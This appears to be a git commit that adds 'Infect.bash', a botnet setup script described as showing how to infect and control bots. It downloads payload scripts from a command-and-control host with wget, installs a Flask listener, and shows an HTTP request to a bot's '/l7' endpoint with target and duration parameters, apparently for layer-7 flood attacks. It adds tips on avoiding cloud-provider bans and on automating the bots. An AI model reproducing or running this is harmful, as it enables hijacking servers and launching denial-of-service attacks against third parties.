df46827af41c35f109415078583ee5b294626a50
ApiAbuse <68893555+ixzy@users.noreply.github.com>
2022-11-26 14:15:01 -0500

    made infect.bash
    to show u how u would infect/control the bot

---
+++ Infect.bash
@@ -0,0 +1,19 @@
+#how u would infect lmao
+echo "this can be used for byob LMAO"
+echo "remember this is for INFECTED servers this is a example on hiow u could control these bots via http"
+# idk ur os man so u finna have to do this shit
+# sudo yum install nodejs -y                # if u need a module do nodejs-npm i think it ws
+# sudo apt install nodejs -y                # if u need a module do nodejs-npm i think it ws
+# node                                      #for GCES like google cloud and replit (also github)
+''                                          # just press enter
+wget https://c2.luvfedded.repl.co/e/raw.js
+echo "also keep inmind that u could also use this for a replit bot method and ill tech u how to setup the bot-controller aswell"
+wget https://c2.luvfedded.repl.co/e/host.py
+#idk ur os man LMAO
+# sudo yum install python3   # sudo yum install python3-pip
+# sudo apt install python3   # sudo apt install python3-pip
+# python3                    # for gces like google,repl,github etc
+python3 -m pip install flask
+
+# run the cmd (python3 host.py) to run the listening script then if u wanna cointrol this bot its
+# requests.head(uri="BOTIP:8080/l7?target=""&time=300") #now if this is a gce it might core dump fast depending if it is good or not (dont do google cloud it bans) repl doesnt however if u make this automated u can easily do this with the http url instead and use uptime robot
